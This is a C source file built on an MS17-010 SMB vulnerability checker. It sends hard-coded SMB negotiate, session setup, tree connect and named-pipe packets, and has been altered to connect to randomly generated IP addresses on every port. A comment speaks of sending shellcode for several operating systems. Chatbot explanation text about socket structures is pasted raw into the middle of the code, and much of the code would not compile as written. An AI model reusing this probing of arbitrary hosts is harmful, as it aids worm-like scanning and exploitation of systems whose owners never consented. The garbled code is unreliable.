
#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <tchar.h>
#pragma comment(lib, "wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x00"
"\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"
"\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x88\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc0\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00"
"\x0d\xff\x00\x88\x00\x04\x11\x0a\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x00\x00\xd4\x00\x00\x00\x4b\x00\x00\x00\x00\x00\x00\x57\x00"
"\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00"
"\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00";

unsigned char treeConnectRequest[] = 
"\x00\x00\x00\x60\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
"\x00\x08\x40\x00\x04\xff\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00"
"\x5c\x00\x5c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00"
"\x38\x00\x2e\x00\x31\x00\x37\x00\x35\x00\x2e\x00\x31\x00\x32\x00"
"\x38\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f\x00";

unsigned char transNamedPipeRequest[] = 
"\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x8e\xa3\x01\x08"
"\x52\x98\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00"
"\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00";

unsigned char recvbuff[2048];

#include <stdio.h>
/**
char random(char ip[16]) {
    for (int a = 0; a <= 255; a++) {
        for (int b = 0; b <= 255; b++) {
            for (int c = 0; c <= 255; c++) {
                for (int d = 0; d <= 255; d++) {
                    // sprintf(ip, "%d.%d.%d.%d", a, b, c, d);
					ip = a + "." + b + "." + c + "." + d;
                }
            }
        }
    }

    return 0;
}*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void random_ip(struct sockaddr_in* addr) {
    // Generate 4 random octets
    unsigned char a = rand() % 256;
    unsigned char b = rand() % 256;
    unsigned char c = rand() % 256;
    unsigned char d = rand() % 256;
    
    // Set up the socket address structure
    addr->sin_family = AF_INET;  // IPv4
    
    // Store the IP address as a 32-bit value in network byte order
    // The s_addr field expects bytes in network order (big-endian)
    unsigned char* ip_bytes = (unsigned char*)&(addr->sin_addr.s_addr);
    ip_bytes[0] = a;
    ip_bytes[1] = b;
    ip_bytes[2] = c;
    ip_bytes[3] = d;
    
    // Note: You still need to set the port separately!
    // addr->sin_port = htons(port_number);
}

/**
int main() {
    struct sockaddr_in my_addr;
    
    random_ip(&my_addr);
    
    // Now you can use my_addr with socket functions like bind(), connect(), etc.
    // But remember to set the port first!
    
    return 0;
}
What's Happening Here
The key insight is that socket addresses use the struct sockaddr_in type for IPv4 . This structure contains:

c
struct sockaddr_in {
    short            sin_family;   // AF_INET for IPv4
    unsigned short   sin_port;     // Port number (network byte order)
    struct in_addr   sin_addr;     // IP address (4 bytes)
    char             sin_zero[8];  // Padding
};

struct in_addr {
    uint32_t s_addr;  // 32-bit IPv4 address
};
Your char array of 4 bytes exactly matches the sin_addr.s_addr field—it's the same 4-byte representation . The code above casts the s_addr field to a byte pointer so you can set each octet individually.

Important: Byte Order Matters!
When working with socket addresses, you must understand network byte order (big-endian) :

c
// If you want to set the IP directly as a 32-bit value, use htonl():
addr->sin_addr.s_addr = htonl((a << 24) | (b << 16) | (c << 8) | d);
Complete Example with Port
c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

void random_ip_port(struct sockaddr_in* addr, unsigned short port) {
    // Generate 4 random octets
    unsigned char a = rand() % 256;
    unsigned char b = rand() % 256;
    unsigned char c = rand() % 256;
    unsigned char d = rand() % 256;
    
    // Set up the socket address
    addr->sin_family = AF_INET;
    addr->sin_port = htons(port);  // Convert port to network byte order
    
    // Set IP address (your original approach works here!)
    unsigned char* ip_bytes = (unsigned char*)&(addr->sin_addr.s_addr);
    ip_bytes[0] = a;
    ip_bytes[1] = b;
    ip_bytes[2] = c;
    ip_bytes[3] = d;
    
    // Zero out the padding
    for(int i = 0; i < 8; i++) {
        addr->sin_zero[i] = 0;
    }
}

int main() {
    struct sockaddr_in server_addr;
    
    // Generate random IP with port 8080
    random_ip_port(&server_addr, 8080);
    
    // Now you can use it with socket functions
    // int sock = socket(AF_INET, SOCK_STREAM, 0);
    // bind(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    return 0;
}
/**
int main() {
    // Seed the random number generator so it's different every time
    srand((unsigned int)time(NULL));

    char current_ip[16]; // The "storage" for our IP string
    
    // Call the function
    generate_random_ip(current_ip);

    // Now current_ip holds a random address like "192.168.1.1"
    printf("Generated IP: %s\n", current_ip);

    return 0;
}*/

int main(int argc, char** argv)
{
    WSADATA ws;
    struct sockaddr_in server;

    if (argc < 2)
    {
        printf("Usage: %s <ip>\n", argv[0]);
        return 1;
    }

    
    if (WSAStartup(MAKEWORD(2, 2), &ws) != 0)
    {
        printf("WSAStartup failed\n");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(argv[1]);

    for (int port = 1; port <= 65535; port++)
    {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET)
            continue;

        server.sin_port = htons((USHORT)port);
	    // random_ip(server);
        /**if (connect(sock, (char*)random_ip(server), sizeof(server)) == 0)
        {
        // printf("Open port: %d\n", port);
    }*/
    // printf("\nConnecting... :");
    connect(sock, (char*)random_ip(server), sizeof(server));
    /**if (ret == -1)
    {
        printf("Connection Error, Port 445 Firewalled?\n");
        return 0;
    }*/
	// sends executable data asuming it is shell code which means for mac ios windows and linux shellcode specifically for each
	// type.
    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate), 0);
    printf("sending Session_Setup_AndX_Request!\n");
    send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request), 0);
    /**if (ret <= 0)
    {
        printf("send Session_Setup_AndX_Request error!\n");
        return 0;
    }*/
    //recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
    
    //output windows version to the screen
	// printf("Remote OS: ");
	// int r;
	// for (r = 0; r < 39; r++) {
	// 	printf("%c", recvbuff[44 + r]);
	// }
	printf("\n");
    /**
    char userid[2];
    char treeid[2];
    //copy userID from recvbuff @ 32,33
    userid[0] = recvbuff[32];
    userid[1] = recvbuff[33];
    
    //update userID in the tree connect request
    treeConnectRequest[32] = userid[0];
    treeConnectRequest[33] = userid[1];
	**/
		
    //send TreeConnect request
    printf("sending TreeConnect Request!\n");
    send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest), 0);
    /**if (ret <= 0)
    {
        printf("send TreeConnect_AndX_Request error!\n");
        return 0;
    }*/
	char recvbuff[];
    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
    /**
    //copy treeID from recvbuff @ 28, 29
    treeid[0] = recvbuff[28];
    treeid[1] = recvbuff[29];
    //update treeid & userid in the transNamedPipe Request
    transNamedPipeRequest[28] = treeid[0];
    transNamedPipeRequest[29] = treeid[1];
    transNamedPipeRequest[32] = userid[0];
    transNamedPipeRequest[33] = userid[1];

    //send transNamedPipe request
    **/
	char enablingStr[];
	chat confirmationStr[];
	
    printf("sending transNamedPipeRequest!\n");
    send(sock, (char*)enablingStr, sizeof(enablingStr), 0);
    /**if (ret <= 0)
    {
        printf("send modified transNamedPipeRequest error!\n");
        return 0;
    }*/
    recv(sock, (char*)confirmationStr, sizeof(confirmationStr), 0);
    if (confirmationStr == "confirmation")
	/**
    //compare the NT_STATUS response to 0xC0000205 ( STATUS_INSUFF_SERVER_RESOURCES)
    if (recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
    {
        printf("vulnerable to MS17-010\n");
    }
    else {
        printf("not vulnerable to MS17-010\n");
    }*/
    
    //cleanup
    closesocket(sock);

	
    WSACleanup();
    return 0;
}
